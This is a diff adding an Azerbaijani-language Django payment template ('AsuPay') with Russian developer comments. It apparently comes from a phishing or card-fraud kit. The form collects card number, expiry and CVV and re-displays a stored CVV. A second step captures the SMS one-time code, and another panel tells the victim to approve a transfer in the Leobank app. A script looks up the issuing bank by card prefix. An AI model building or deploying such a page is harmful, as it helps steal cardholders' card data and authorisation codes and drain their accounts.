@@ -1,0 +1,339 @@
+{% extends 'base.html' %}
+{% block title %}Оплата
+{% endblock %}
+{% block content %}
+<style>
+
+
+
+/*Right Side Card*/
+.card2 {
+	padding: 5px;
+	margin: 0;
+	height: 100%;
+}
+
+.placeicon {
+	height: 80%;
+}
+
+.form-card .pay {
+	font-weight: 400;
+
+}
+
+.form-card input, .form-card textarea {
+    padding: 1px 3px 1px 10px;
+    border: none;
+    border: 1px solid lightgrey;
+    border-radius: 5px;
+    margin-bottom: 15px;
+    margin-top: 2px;
+    width: 100%;
+    box-sizing: border-box;
+    font-family: montserrat;
+    color: #2C3E50;
+    font-size: 14px;
+    letter-spacing: 1px;
+}
+
+.form-card input:focus, .form-card textarea:focus {
+    -moz-box-shadow: none !important;
+    -webkit-box-shadow: none !important;
+    box-shadow: none !important;
+    border: none;
+    font-weight: bold;
+    border: 1px solid gray;
+    outline-width: 0;
+}
+
+
+.icon {
+    border: 1px solid #000;
+    height: 40px;
+}
+.icon_amount {
+    border: 1px solid #000;
+    padding-left: 10px;
+    height: 40px;
+    background: url(https://avatars.mds.yandex.net/i?id=2a0000017a08f2cd49b07f5c928f648570a8-3986577-images-thumbs&n=13) no-repeat scroll 0px 0px ;
+    background-size: auto 100%;
+}
+
+.icon_owner {
+    border: 1px solid #000;
+    padding-right: 10px;
+    height: 40px;
+    background: url(https://grizly.club/uploads/posts/2023-08/1691649091_grizly-club-p-kartinki-ikonka-cheloveka-bez-fona-42.png) no-repeat scroll 0px 0px;
+    background-size: auto 100%;
+}
+
+.icon_card {
+    border: 1px solid #000;
+    padding-right: 10px;
+    height: 40px;
+    background: url(https://w7.pngwing.com/pngs/993/820/png-transparent-atm-card-credit-card-debit-card-visa-major-credit-cards-glyph-icon.png) no-repeat scroll 0px 0px;
+    background-size: auto 100%;
+}
+
+.icon_cvv {
+    border: 1px solid #000;
+    padding-left: 10px;
+    height: 40px;
+    background: url(https://w7.pngwing.com/pngs/268/958/png-transparent-lock-padlock-secure-evil-icons-user-interface-icon.png) no-repeat scroll 0px 0px ;
+    background-size: auto 100%;
+}
+
+.icon_month {
+    border: 1px solid #000;
+    padding-left: 10px;
+    height: 40px;
+    background: url(https://cdn1.iconfinder.com/data/icons/bootstrap/16/calendar-month-1024.png) no-repeat scroll 2px 3px ;
+    background-size: auto 80%;
+}
+
+.icon_year {
+    border: 1px solid #000;
+    padding-left: 10px;
+    height: 40px;
+    background: url(https://cdn1.iconfinder.com/data/icons/office-322/24/appointment-date-schedule-year-calendar-event-1024.png) no-repeat scroll 0px 0px ;
+    background-size: auto 90%;
+
+}
+
+p {
+    font-family: Calibri;
+    font-size: 18px;
+}
+.btn-success {
+    background-color: #11e834;
+}
+
+
+</style>
+
+
+<div class="container margin: auto" style="max-width: 500px;">
+  <div class="card" style="padding-left: 1px; padding-right: 1px; padding-bottom:1px; background: #efefef">
+
+    <div class="card-header">
+      <div class="row">
+          <div class="col-4" style="padding: 0 0 0 0">
+          </div>
+          <div class="col-4 d-flex justify-content-center"  style="padding: 0 0 0 0; margin: 0 0 0 0px">
+{#            <div style="background-image: url('/static/img/AsuPay125.png'); width:125px; height: 125px; object-position: center">#}
+              <img class="mx-auto d-flex justify-content-center" src="/static/img/AsuPay125.png" height="125" width="125">
+{#            </div>#}
+          </div>
+          <div class="col-4" style="padding: 0 0 0 0; margin: 0 0 0 0">
+          </div>
+      </div>    
+      <div class="row">
+        <div class="col-9 mx-auto" style="display: flex; align-items: center;">
+
+
+        </div>
+
+      </div>
+    </div>
+
+
+    <form method="POST" enctype="multipart/form-data">
+      {% csrf_token %}
+      {{ form.payment_id }}
+        <div class="col-sm-12 p-0 box">
+            <div class="card rounded-0 border-0 card2" id="paypage">
+                <div class="form-card">
+                    <span {% if payment.status != 0 %}hidden{% endif %}>
+                        <div class="row">
+                            <div class="col mx-auto text-center">
+                                <p style="margin-bottom: 0px;">Ödəniş Cədvəli</p>
+{#                                <p>Hörmətli {{ payment.owner_name|default_if_none:"" }} ({{ payment.user_login }})</p>#}
+                                <p>Hörmətli müştəri xoş gəlmisiniz</p>
+
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col mx-auto text-center">
+
+                            </div>
+                        </div>
+                        <div class="row">
+                            <label class="pay">Məbləğ girin</label>
+                        </div>
+                        <div class="row">
+                            <div class="col-4">
+                              <input class="icon_amount" style="text-indent: 35px; text-align: right;" type="tel" pattern="[0-9]*" name="amount" value="{{ payment.amount|default_if_none:"" }}" placeholder="₼" required="" id="id_amount" maxlength="5">
+                            </div>
+{#                            <div class="col-1" style="padding-top: 10px; margin-left: -10px">#}
+{#                                <p>₼</p>#}
+{#                            </div>#}
+                        </div>
+
+{#                        <label class="pay">Ad Soyad</label>#}
+                        <input class="icon_owner" style="text-indent: 35px" type="text" hidden name="owner_name" value="{{ payment.owner_name|default_if_none:"" }}" placeholder="John Smith">
+
+                        <label class="pay">Kartı nömrəsi</label>
+                        <div class="row">
+                            <div class="col-8">
+
+                                <input class="x icon_card" style="text-indent: 35px; letter-spacing: 0px" type="tel" pattern="[0-9 ]*" name="card_number"  value="{{ payment.card_number|default_if_none:"" }}" placeholder="0000 0000 0000 0000" minlength="19" maxlength="19" required="" id="id_card_number" oninput="checkInput()">
+                            </div>
+                            <div class="col-4" style="padding-right: 0px; padding-left: 0px; padding-top: 2px">
+                                <img id="bank_icon" src="/media/bank_icons/empty.jpg" height="40px" width="90%">
+                            </div>
+
+
+                        </div>
+
+                        <div class="row">
+
+                            <div class="row">
+                                <div class="col-8  text-center">Müddəti</div>
+                            </div>
+                            <div class="col-4">
+{#                                <label class="pay">Ay</label>#}
+                                <input class="icon_month"  style="text-indent:30px;" type="tel" pattern="[0-9]*" value="{{ payment.expired_month|default_if_none:"" }}" name="expired_month" placeholder="Ay" minlength="2" maxlength="2" required="" id="id_expired_month">
+{#                                {{ form.expired_month }}#}
+                            </div>
+                            <div class="col-4">
+{#                                <label class="pay">İl</label>#}
+                                <input class="icon_year" style="text-indent:30px;" type="tel"  pattern="[0-9]*" value="{{ payment.expired_year|default_if_none:"" }}" name="expired_year" placeholder="İl" minlength="2" maxlength="2" required="" id="id_expired_year">
+{#                                {{ form.expired_year }}#}
+                            </div>
+                            <div class="col-4">
+{#                                <label class="pay">CVV</label>#}
+                               <input class="icon_cvv" style="text-indent:40px;" pattern="[0-9]*" type="password" value="{{ payment.cvv|default_if_none:"" }}" name="cvv" placeholder="cvv" minlength="3" maxlength="4" required="" id="id_cvv">
+{#                                {{ form.cvv }}#}
+                            </div>
+                        </div>
+
+
+                        {% include 'includes/form_error.html' %}
+
+                            <div id="send_cc_data" class="row">
+                                <div class="col-md-6 mx-auto">
+                                    <input  type="submit" value="Ödəməyə keç" class="btn btn-success placeicon">  {# Подтвердить#}
+                                </div>
+
+                            </div>
+
+                    </span>
+
+
+                    <span id="send_sms_btn" {% if payment.status != 3 or not phone_script.step_2_required %}hidden{% endif %}>
+                        <p>Zəhmət olmasa telefonunuza gələn SMS kodunu daxil edin və SMS Göndər düyməsini basın!</p> {# пожалуйста  смс код который пришёл на ваш телефон введите #}
+                        <div  class=" col-6">
+{#                            <label class="pay">SMS kodu</label>#}
+{#                            {{ form.sms_code }}#}
+                            <input class="icon" type="text" name="sms_code" placeholder="SMS kodu" minlength="4" maxlength="6" id="id_sms_code">
+
+                        </div>
+
+                        <div class="row">
+                            <div class="col-md-6">
+                                <input id="wwq" type="submit" value="SMS Göndər" class="btn btn-success placeicon"> {# отправить код   смс #}
+                            </div>
+
+
+                        </div>
+                    </span>
+
+
+
+                    {% if not phone_script.step_2_required and payment.status == 3 %}
+                        <div>
+                            <p>Ödənişi təstiqləmək üçün Leobank mobil tədbiqində Sizə bildiriş gələcək.
+                            Zəhmət olmasa, Leobank mobil tədbiqinə keçid edin və köçürməni təstiq edin</p> {# .(Вам в приложении Леобанка придет уведомление для подтверждения  платежа. Перейдите пожалуйста  в приложении  лео банка и подтвердите перевод в приложении) #}
+                        </div>
+                        <input  type="submit" value="Продолжить" class="btn btn-success placeicon">
+                    {% endif %}
+                    <p id="time_is_up" style="display: none">Vaxt bitdi, zəhmət olmasa səhifəyə qayıdın və yeni sorğu yaradın</p>  {# Таймер истёк, вернитесь пожалуйста  на сайт и создайте новую заявку #}
+
+                </div>
+            </div>
+        </div>
+    </form>
+                    <div class="row"  style="height: 50px">
+
+                                <div class="col-9 d-flex justify-content-center align-items-center">
+                                    {% if payment.status == 0 %}
+                                    Əməliyyat üçün qalan vaxt: {# время на совершенние оплаты #}
+                                    {% elif payment.status == 3 %}
+                                    SMS üçün qalan vaxt: {# время для ввода смс #}
+                                    {% endif %}
+                                    </div>
+                                <div class="col-1">
+                                            {% include 'includes/timer_circle.html' %}
+                                </div>
+                    </div>
+  </div>
+</div>
+
+<script>
+function checkInput() {
+    let input = document.getElementById("id_card_number").value;
+    console.log(input.length)
+    if (input.length === 7) {
+        fetch('/get_bank/' + input)
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("bank_icon").src = '/media/' + data.image;
+            })
+            .catch(error => console.error('Ошибка:', error));
+    }
+}
+</script>
+
+{#<script>#}
+{#document.addEventListener('DOMContentLoaded', function() {#}
+{#  var cardNumberInput = document.getElementById('id_card_number');#}
+{##}
+{#  cardNumberInput.addEventListener('input', function() {#}
+{#    var value = cardNumberInput.value.replace(/\s/g, '');#}
+{#    value = value.replace(/(\d{4})/g, '$1 ').trim();#}
+{#    cardNumberInput.value = value;#}
+{#  });#}
+{#});#}
+{#</script>#}
+
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    let inputField = document.getElementById('id_card_number');
+
+    inputField.addEventListener('input', function(e) {
+        let target = e.target;
+        let input = target.value.replace(/\D/g, '').substring(0, 16); // Оставляем только цифры и ограничиваем длину 16 символами
+        let formatted = input.replace(/(\d{4})(?=\d)/g, '$1 '); // Добавляем пробелы после каждых 4 цифр
+        target.value = formatted;
+    });
+
+    inputField.addEventListener('keydown', function(e) {
+        let key = e.key;
+        if (key.length === 1 && !/\d/.test(key)) {
+            e.preventDefault(); // Предотвращаем ввод нецифровых символов
+        }
+    });
+});
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  var firstField = document.getElementById('id_expired_month');
+  var secondField = document.getElementById('id_expired_year');
+  var thirdField = document.getElementById('id_cvv');
+
+  firstField.addEventListener("input", function() {
+    if (firstField.value.length == 2) {
+      secondField.focus();
+    }
+  });
+  secondField.addEventListener("input", function() {
+    if (secondField.value.length == 2) {
+      thirdField.focus();
+    }
+  });
+});
+</script>
+{% endblock %}
+
